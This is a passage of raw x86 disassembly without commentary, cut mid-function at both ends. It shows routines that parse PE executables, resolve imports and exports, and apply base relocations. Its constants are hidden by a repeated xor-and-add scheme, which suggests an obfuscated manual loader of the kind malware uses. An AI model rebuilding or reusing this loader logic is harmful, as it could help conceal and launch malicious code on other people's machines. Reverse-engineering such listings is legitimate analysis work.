  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
  421af3:	test   eax,eax
  421af5:	je     0x421f7c
  421afb:	mov    eax,DWORD PTR [ebp+0xc]
  421afe:	test   eax,eax
  421b00:	je     0x421f7c
  421b06:	mov    eax,DWORD PTR [ebp+0x18]
  421b09:	test   eax,eax
  421b0b:	je     0x421f7c
  421b11:	mov    eax,DWORD PTR [ebp+0x20]
  421b14:	mov    ecx,DWORD PTR [ebp+0x8]
  421b17:	xor    eax,0x8b3
  421b1c:	add    eax,0x72fa
  421b21:	cmp    WORD PTR [ecx],ax
  421b24:	jne    0x421f7c
  421b2a:	mov    eax,DWORD PTR [ebp-0x4]
  421b2d:	xor    eax,esi
  421b2f:	add    eax,edi
  421b31:	mov    DWORD PTR [ebp-0x30],eax
  421b34:	mov    eax,DWORD PTR [ebp-0x4]
  421b37:	mov    ecx,DWORD PTR [ebp+0x8]
  421b3a:	mov    eax,DWORD PTR [ebp+0x8]
  421b3d:	add    eax,DWORD PTR [ecx+0x3c]
  421b40:	mov    DWORD PTR [ebp+0xc],eax
  421b43:	mov    eax,DWORD PTR [eax+0x50]
  421b46:	test   eax,eax
  421b48:	je     0x421f7c
